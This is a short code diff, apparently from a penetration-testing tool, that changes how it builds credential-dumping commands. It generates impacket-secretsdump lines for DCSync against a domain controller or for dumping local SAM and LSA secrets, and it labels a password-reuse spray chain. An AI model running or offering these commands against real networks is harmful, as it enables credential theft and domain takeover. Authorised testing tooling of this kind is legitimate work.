@@ -326,12 +326,16 @@ def run(report, store, ui=None):
             # the DCSync form needs a DC target.
             _r1_prox = _prox(store, smb)
             _r1_tgt_dc = _r1_prox >= 1.0
+            # iter-110: whole-URI single-quoting for parity with R7 / R-*
+            # chains. 'user:pw@target' as one unit; special chars in pw stay
+            # literal.
+            _r1_uri = f"'{disp}:{pw}@{smb}'"
             if _r1_tgt_dc:
-                _r1_dump = f"impacket-secretsdump '{disp}':'{pw}'@{smb} -just-dc"
+                _r1_dump = f"impacket-secretsdump {_r1_uri} -just-dc"
                 _r1_dump_note = (f"# AFTER confirming Pwn3d! on {smb}, then dcsync "
                                  f"(gates the secretsdump):")
             else:
-                _r1_dump = f"impacket-secretsdump '{disp}':'{pw}'@{smb}"
+                _r1_dump = f"impacket-secretsdump {_r1_uri}"
                 _r1_dump_note = (f"# AFTER confirming Pwn3d! on {smb}, dump local "
                                  f"SAM + LSA cached secrets (target isn't the DC):")
             chains.append(Chain("R1", "spray", f"reuse {disp}:{pw} across hosts",
